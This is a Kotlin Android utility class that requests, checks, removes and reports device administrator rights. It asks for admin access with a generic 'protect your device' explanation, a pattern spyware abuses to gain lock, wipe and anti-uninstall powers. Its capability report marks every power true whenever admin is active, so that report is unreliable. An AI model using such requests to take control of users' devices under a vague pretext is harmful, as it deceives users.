package com.sync.xxx.managers

import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.util.Log
import org.json.JSONObject

/**
 * AdminRightsManager.kt
 * Request and manage device admin rights
 * Handle admin privileges and permissions
 */
class AdminRightsManager(private val context: Context) {

    private val TAG = "AdminRightsManager"
    private val devicePolicyManager = context.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager

    /**
     * Request device admin rights
     */
    fun requestAdminRights(adminReceiverClass: Class<*>): Boolean {
        return try {
            val componentName = ComponentName(context, adminReceiverClass)
            
            if (isAdminActive(componentName)) {
                Log.d(TAG, "Admin rights already granted")
                return true
            }

            val intent = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN)
            intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, componentName)
            intent.putExtra(
                DevicePolicyManager.EXTRA_ADD_EXPLANATION,
                "This app requires device administrator access to provide advanced security features and protect your device."
            )
            intent.flags = Intent.FLAG_ACTIVITY_NEW_TASK
            context.startActivity(intent)
            
            Log.d(TAG, "Admin rights requested")
            true
        } catch (e: Exception) {
            Log.e(TAG, "Error requesting admin rights", e)
            false
        }
    }

    /**
     * Check if admin is active
     */
    fun isAdminActive(componentName: ComponentName): Boolean {
        return try {
            devicePolicyManager.isAdminActive(componentName)
        } catch (e: Exception) {
            Log.e(TAG, "Error checking admin status", e)
            false
        }
    }

    /**
     * Remove admin rights
     */
    fun removeAdminRights(componentName: ComponentName) {
        try {
            if (isAdminActive(componentName)) {
                devicePolicyManager.removeActiveAdmin(componentName)
                Log.d(TAG, "Admin rights removed")
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error removing admin rights", e)
        }
    }

    /**
     * Get list of active admin components
     */
    fun getActiveAdmins(): List<ComponentName> {
        return try {
            devicePolicyManager.activeAdmins ?: emptyList()
        } catch (e: Exception) {
            Log.e(TAG, "Error getting active admins", e)
            emptyList()
        }
    }

    /**
     * Check if this app has admin rights
     */
    fun hasAdminRights(adminReceiverClass: Class<*>): Boolean {
        val componentName = ComponentName(context, adminReceiverClass)
        return isAdminActive(componentName)
    }

    /**
     * Get admin capabilities
     */
    fun getAdminCapabilities(componentName: ComponentName): AdminCapabilities {
        val isActive = isAdminActive(componentName)
        
        return AdminCapabilities(
            isActive = isActive,
            canLockDevice = isActive,
            canWipeData = isActive,
            canResetPassword = isActive,
            canDisableCamera = isActive,
            canBlockUninstall = isActive
        )
    }

    /**
     * Export admin status as JSON
     */
    fun getAdminStatusAsJson(adminReceiverClass: Class<*>): JSONObject {
        val componentName = ComponentName(context, adminReceiverClass)
        val capabilities = getAdminCapabilities(componentName)
        
        return JSONObject().apply {
            put("isActive", capabilities.isActive)
            put("canLockDevice", capabilities.canLockDevice)
            put("canWipeData", capabilities.canWipeData)
            put("canResetPassword", capabilities.canResetPassword)
            put("canDisableCamera", capabilities.canDisableCamera)
            put("canBlockUninstall", capabilities.canBlockUninstall)
            put("componentName", componentName.flattenToString())
        }
    }

    /**
     * Export admin status as text
     */
    fun exportAdminStatus(adminReceiverClass: Class<*>): String {
        val componentName = ComponentName(context, adminReceiverClass)
        val capabilities = getAdminCapabilities(componentName)
        val sb = StringBuilder()

        sb.append("Device Admin Rights\n")
        sb.append("=".repeat(60)).append("\n\n")

        sb.append("--- Status ---\n")
        sb.append("Active: ${if (capabilities.isActive) "Yes" else "No"}\n")
        sb.append("Component: ${componentName.flattenToString()}\n\n")

        if (capabilities.isActive) {
            sb.append("--- Capabilities ---\n")
            sb.append("Lock Device: ${if (capabilities.canLockDevice) "Yes" else "No"}\n")
            sb.append("Wipe Data: ${if (capabilities.canWipeData) "Yes" else "No"}\n")
            sb.append("Reset Password: ${if (capabilities.canResetPassword) "Yes" else "No"}\n")
            sb.append("Disable Camera: ${if (capabilities.canDisableCamera) "Yes" else "No"}\n")
            sb.append("Block Uninstall: ${if (capabilities.canBlockUninstall) "Yes" else "No"}\n")
        }

        return sb.toString()
    }

    /**
     * Admin capabilities data class
     */
    data class AdminCapabilities(
        val isActive: Boolean,
        val canLockDevice: Boolean,
        val canWipeData: Boolean,
        val canResetPassword: Boolean,
        val canDisableCamera: Boolean,
        val canBlockUninstall: Boolean
    )

    companion object {
        /**
         * Request admin rights (static)
         */
        fun requestAdmin(context: Context, adminReceiverClass: Class<*>): Boolean {
            return try {
                val manager = AdminRightsManager(context)
                manager.requestAdminRights(adminReceiverClass)
            } catch (e: Exception) {
                false
            }
        }

        /**
         * Check if admin is active (static)
         */
        fun isAdminActive(context: Context, adminReceiverClass: Class<*>): Boolean {
            return try {
                val manager = AdminRightsManager(context)
                val componentName = ComponentName(context, adminReceiverClass)
                manager.isAdminActive(componentName)
            } catch (e: Exception) {
                false
            }
        }
    }
}
